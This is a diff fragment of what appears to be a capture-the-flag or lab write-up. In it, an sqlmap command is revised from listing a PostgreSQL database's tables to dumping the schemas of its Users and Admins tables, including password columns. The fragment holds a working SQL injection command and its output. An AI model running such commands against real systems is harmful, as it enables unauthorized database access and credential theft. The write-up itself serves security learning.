@@ -192,22 +192,33 @@ available databases [1]:
 I have managed to the dump the database name, i can now dump its contents
 
 ```python
-sqlmap -r request.txt --level=4 --risk=3 --flush-session --batch --dbs -D public --tables
+sqlmap -r request.txt --level=4 --risk=3 --flush-session --batch --dbs --dbms=postgresql -D public --schema
 
-available databases [1]:
-[*] public
-
-[19:11:57] [INFO] fetching tables for database: 'public'
-[19:11:57] [INFO] fetching number of tables for database 'public'
-[19:11:57] [INFO] retrieved: 2
-[19:11:58] [INFO] retrieved: Admins
-[19:12:00] [INFO] retrieved: Users
 Database: public
-[2 tables]
-+--------+
-| Admins |
-| Users  |
-+--------+
+Table: Users
+[6 columns]
++-------------+---------+
+| Column      | Type    |
++-------------+---------+
+| email       | varchar |
+| host_header | varchar |
+| id          | int4    |
+| ip_address  | varchar |
+| password    | varchar |
+| username    | varchar |
++-------------+---------+
+
+Database: public
+Table: Admins
+[4 columns]
++----------+---------+
+| Column   | Type    |
++----------+---------+
+| email    | varchar |
+| id       | int4    |
+| password | varchar |
+| username | varchar |
++----------+---------+
 ```
 
 There are two tables in this DB
